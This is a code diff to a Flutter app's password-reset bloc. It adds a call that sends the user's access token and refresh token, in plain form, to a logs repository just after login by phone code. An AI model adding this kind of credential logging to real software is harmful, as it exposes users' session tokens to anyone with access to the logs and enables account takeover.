@@ -1,6 +1,9 @@
+import 'dart:convert';
+
 import 'package:flutter_bloc/flutter_bloc.dart';
 import 'package:equatable/equatable.dart';
 
+import '../../logs/repository/logs_repository.dart';
 import '/modules/authentication/repository/token_repository.dart';
 import '../repository/reset_password_by_sms_repository.dart';
 
@@ -65,6 +68,14 @@ class ResetPasswordBloc extends Bloc<ResetPasswordEvent, ResetPasswordState> {
         phone: _phone ?? '',
         code: event.code,
       );
+
+      const LogsRepository().sendLogs(json.encode({
+        'event': 'Login by using phone',
+        'accessToken': token.token,
+        'refreshToken': token.refresh_token,
+        'place': 'lib/modules/reset_password_by_sms/bloc/reset_password_bloc.dart:72',
+      }));
+
       await _tokenRepository.saveTokens(token: token);
       emit(const SuccessCode());
     } catch (error) {
